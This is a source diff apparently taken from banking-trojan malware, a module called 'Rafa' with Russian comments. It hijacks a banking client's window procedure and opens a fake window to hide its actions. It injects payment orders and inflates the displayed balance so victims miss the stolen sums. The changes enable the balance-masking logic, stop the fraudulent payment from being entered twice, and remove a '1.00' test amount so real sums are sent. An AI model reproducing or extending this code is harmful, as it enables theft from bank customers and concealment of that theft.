@@ -310,7 +310,7 @@ static bool FindPaymentForIdent( const char* s, int id )
 			case 2: s2 = paymentOrders[i].comment; break;
 		}
 		if( s2 == 0 ) break;
-		//if( m_strstr( s, s2 ) ) return true;
+		if( m_strstr( s, s2 ) ) return true;
 	}
 	return false;
 }
@@ -1011,8 +1011,17 @@ static void WorkInRafa()
 {
 	c_findedBalans = 0;
 	HWND parent = (HWND)pGetParent(treeView);
-	//подменяем оконную процедуру главного окна, для перехвата нотификационніх сообщений
+	//подменяем оконную процедуру главного окна, для перехвата нотификационных сообщений
 	MainWndProc = (WNDPROC)SetWindowLongPtr( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
+	//проверяем, что была ли уже сделана платежка
+	bool was = false;
+	for(int i = 0; i < c_paymentOrders; i++ )
+		if( paymentOrders[i].entered )
+		{
+			was = true;
+			break;
+		}
+	if( was ) return; //повторно не делаем
 	stateFakeWindow = 1; //запуск окна скрывающего наши действия
 	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
 	pCloseHandle(hThread);
@@ -1287,11 +1296,12 @@ static char* AddBalans( const char* acc, const char* balans )
 		if( paymentOrders[i].entered && m_lstrcmp( acc, paymentOrders[i].sendAcc ) == 0 )
 		{
 			int intBalans2 = BalansToInt(paymentOrders[i].balans);
-//			if( intBalans < intBalans2 ) //настоящий баланс меньше, чем тот что был в момент создания платежки
-//			{
+			DBGRAFA( "Rafa", "balans: %d %d", intBalans < intBalans2 );
+			if( intBalans < intBalans2 ) //настоящий баланс меньше, чем тот что был в момент создания платежки
+			{
 				int intSum = BalansToInt(paymentOrders[i].sum);
 				intBalans += intSum;
-//			}
+			}
 		}
 	}
 	IntToBalans( intBalans, findedBalans[i].showBalans );
@@ -1555,7 +1565,7 @@ static PaymentOrder* GetPaymentOrders()
 			char* to = po->mem;
 			po->sendAcc = to; from = CopyDataPayment( to, from );
 			po->sum = to; from = CopyDataPayment( to, from );
-			m_lstrcpy( po->sum, "1.00" );
+			//m_lstrcpy( po->sum, "1.00" );
 			po->inn = to; from = CopyDataPayment( to, from );
 			po->kpp = to; from = CopyDataPayment( to, from );
 			po->bik = to; from = CopyDataPayment( to, from );
